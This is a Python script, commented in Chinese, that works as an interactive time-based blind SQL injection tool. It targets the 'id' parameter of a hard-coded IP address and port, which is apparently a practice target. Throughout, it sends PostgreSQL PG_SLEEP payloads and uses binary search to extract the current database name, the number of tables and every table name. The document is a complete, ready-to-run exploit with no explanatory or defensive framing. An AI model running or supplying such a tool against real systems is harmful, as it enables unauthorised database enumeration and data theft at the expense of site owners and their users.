import requests
import argparse
import time

#-v选项
print("-v输出详细信息")
# 目标URL
url = "http://124.70.71.251:48524/new_list.php"

# 自定义HTTP头
headers = {
    "Host": "124.70.71.251:48524",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://124.70.71.251:48524/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en,zh-CN;q=0.9,zh;q=0.8",
    "Connection": "keep-alive"
}

# 禁用SSL证书验证
requests.packages.urllib3.disable_warnings()

def interact_module(option, verbose):
    start_time = time.time()  # 记录起始时间

    if option == 1:
        # 模块1：猜解当前数据库名的长度和名称
        current_database_length = None
        for i in range(1, 31):  # 假设数据库名长度在1到30之间
            payload = f"1 AND (SELECT LENGTH(current_database()))={i} AND 1609=(SELECT 1609 FROM PG_SLEEP(5))"
            params = {"id": payload}

            if verbose:
                print(f"[*] Trying length: {i}")

            response = requests.get(url, headers=headers, params=params, verify=False)

            if response.elapsed.total_seconds() >= 5:
                current_database_length = i
                print(f"[+] Found current database name length: {current_database_length}")
                break

        if current_database_length is None:
            print("[-] Current database name length not found")
            return

        # 使用二分法猜解数据库名
        database_name = ""
        for char_position in range(1, current_database_length + 1):
            ascii_range_start = 32
            ascii_range_end = 126
            while ascii_range_start <= ascii_range_end:
                mid = (ascii_range_start + ascii_range_end) // 2
                payload = f"1 AND (SELECT ASCII(SUBSTRING(current_database(),{char_position},1))) BETWEEN {ascii_range_start} AND {mid} AND 1609=(SELECT 1609 FROM PG_SLEEP(5))"
                params = {"id": payload}

                if verbose:
                    print(f"[*] Trying character at position {char_position} between ASCII {ascii_range_start} and {mid}")

                response = requests.get(url, headers=headers, params=params, verify=False)

                if response.elapsed.total_seconds() >= 5:
                    ascii_range_end = mid  # 字符在左半边
                else:
                    ascii_range_start = mid + 1  # 字符在右半边

                if ascii_range_start == ascii_range_end:
                    break

            # 找到字符
            database_name += chr(ascii_range_start)
            print(f"[+] Found character at position {char_position}: {chr(ascii_range_start)}")

        print(f"[+] Database name: {database_name}")

    elif option == 2:
        # 模块2：猜解表的数量
        table_count = None
        for i in range(1, 1001):  # 假设表的数量在1到1000之间
            payload = f"1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')={i} AND 1609=(SELECT 1609 FROM PG_SLEEP(5))"
            params = {"id": payload}

            if verbose:
                print(f"[*] Trying table count: {i}")

            response = requests.get(url, headers=headers, params=params, verify=False)

            if response.elapsed.total_seconds() >= 5:
                table_count = i
                print(f"[+] Found table count: {table_count}")
                break

        if table_count is None:
            print("[-] Table count not found")

    elif option == 3:
        # 模块3：猜解第一个表名
        table_name_length = None
        for i in range(1, 101):  # 假设表名长度在1到100之间
            payload = f"1 AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0)={i} AND 1609=(SELECT 1609 FROM PG_SLEEP(5))"
            params = {"id": payload}

            if verbose:
                print(f"[*] Trying table name length: {i}")

            response = requests.get(url, headers=headers, params=params, verify=False)

            if response.elapsed.total_seconds() >= 5:
                table_name_length = i
                print(f"[+] Found table name length: {table_name_length}")
                break

        if table_name_length is None:
            print("[-] Table name length not found")
            return

        # 猜解第一个表名
        first_table_name = ""
        for char_position in range(1, table_name_length + 1):
            ascii_range_start = 32
            ascii_range_end = 126
            while ascii_range_start <= ascii_range_end:
                mid = (ascii_range_start + ascii_range_end) // 2
                payload = f"1 AND (SELECT ASCII(SUBSTRING(table_name,{char_position},1)) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0) BETWEEN {ascii_range_start} AND {mid} AND 1609=(SELECT 1609 FROM PG_SLEEP(5))"
                params = {"id": payload}

                if verbose:
                    print(f"[*] Trying character at position {char_position} between ASCII {ascii_range_start} and {mid}")

                response = requests.get(url, headers=headers, params=params, verify=False)

                if response.elapsed.total_seconds() >= 5:
                    ascii_range_end = mid  # 字符在左半边
                else:
                    ascii_range_start = mid + 1  # 字符在右半边

                if ascii_range_start == ascii_range_end:
                    break

            # 找到字符
            first_table_name += chr(ascii_range_start)
            print(f"[+] Found character at position {char_position}: {chr(ascii_range_start)}")

        print(f"[+] First table name: {first_table_name}")

    elif option == 4:
        # 模块4：猜解剩余表名
        table_names = []
        for offset in range(1, 10):  # 假设最多有10个表名
            table_name_length = None
            for i in range(1, 101):
                payload = f"1 AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {offset})={i} AND 1609=(SELECT 1609 FROM PG_SLEEP(5))"
                params = {"id": payload}

                if verbose:
                    print(f"[*] Trying table name length for table {offset+1}: {i}")

                response = requests.get(url, headers=headers, params=params, verify=False)

                if response.elapsed.total_seconds() >= 5:
                    table_name_length = i
                    print(f"[+] Found table name length for table {offset+1}: {table_name_length}")
                    break

            if table_name_length is None:
                print(f"[-] Table name length for table {offset+1} not found")
                break

            # 猜解每个表名
            table_name = ""
            for char_position in range(1, table_name_length + 1):
                ascii_range_start = 32
                ascii_range_end = 126
                while ascii_range_start <= ascii_range_end:
                    mid = (ascii_range_start + ascii_range_end) // 2
                    payload = f"1 AND (SELECT ASCII(SUBSTRING(table_name,{char_position},1)) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {offset}) BETWEEN {ascii_range_start} AND {mid} AND 1609=(SELECT 1609 FROM PG_SLEEP(5))"
                    params = {"id": payload}

                    if verbose:
                        print(f"[*] Trying character at position {char_position} between ASCII {ascii_range_start} and {mid} for table {offset+1}")

                    response = requests.get(url, headers=headers, params=params, verify=False)

                    if response.elapsed.total_seconds() >= 5:
                        ascii_range_end = mid  # 字符在左半边
                    else:
                        ascii_range_start = mid + 1  # 字符在右半边

                    if ascii_range_start == ascii_range_end:
                        break

                # 找到字符
                table_name += chr(ascii_range_start)

            table_names.append(table_name)
            print(f"[+] Found table {offset+1} name: {table_name}")

        print(f"[+] All found table names: {', '.join(table_names)}")

    
    end_time = time.time()  # 记录结束时间
    elapsed_time = end_time - start_time  # 计算耗时
    print(f"[+] 注入所用时间: {elapsed_time:.2f} 秒")

# 主函数处理命令行参数
def main():
    parser = argparse.ArgumentParser(description="SQL Injection Tool with Progress Display")
    parser.add_argument("-v", "--verbose", action="store_true", help="show detailed progress")
    args = parser.parse_args()

    verbose = args.verbose

    # 交互式选择模块
    while True:
        print("选择要执行的模块:")
        print("1. 猜解当前数据库名")
        print("2. 猜解表的数量")
        print("3. 猜解第一个表名")
        print("4. 猜解剩余表名")
        print("5. 退出")

        option = input("请选择一个选项: ")

        if option == "1":
            interact_module(1, verbose)
        elif option == "2":
            interact_module(2, verbose)
        elif option == "3":
            interact_module(3, verbose)
        elif option == "4":
            interact_module(4, verbose)
        elif option == "5":
            break
        else:
            print("无效的选项，请重新选择。")

if __name__ == "__main__":
    main()
